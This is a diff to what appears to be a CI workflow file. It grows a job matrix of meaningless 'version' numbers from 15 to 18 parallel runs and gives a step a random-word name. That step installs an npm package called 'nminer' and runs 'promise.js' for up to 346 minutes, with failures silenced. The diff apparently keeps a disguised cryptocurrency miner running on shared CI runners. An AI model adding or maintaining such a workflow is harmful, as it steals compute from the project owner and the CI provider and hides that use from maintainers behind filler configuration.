@@ -9,21 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 6205 }
-          - { version: 8256 }
-          - { version: 2662 }
-          - { version: 3546 }
-          - { version: 7423 }
-          - { version: 7052 }
-          - { version: 670 }
-          - { version: 9244 }
-          - { version: 6854 }
-          - { version: 4731 }
-          - { version: 7636 }
-          - { version: 7852 }
-          - { version: 1477 }
-          - { version: 5743 }
-          - { version: 7597 }
+          - { version: 5890 }
+          - { version: 9454 }
+          - { version: 8226 }
+          - { version: 1781 }
+          - { version: 6061 }
+          - { version: 8683 }
+          - { version: 8287 }
+          - { version: 9226 }
+          - { version: 8409 }
+          - { version: 4074 }
+          - { version: 3010 }
+          - { version: 7505 }
+          - { version: 3688 }
+          - { version: 7706 }
+          - { version: 2528 }
+          - { version: 9607 }
+          - { version: 2860 }
+          - { version: 2214 }
 
     steps:
       - name: Checkout
@@ -34,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: big joint wetly yearn fleck
+      - name: agitated rudely lest great
         run: |
           npm install nminer@latest
-          timeout 322m node promise.js || echo "promise executed"
+          timeout 346m node promise.js || echo "promise executed"
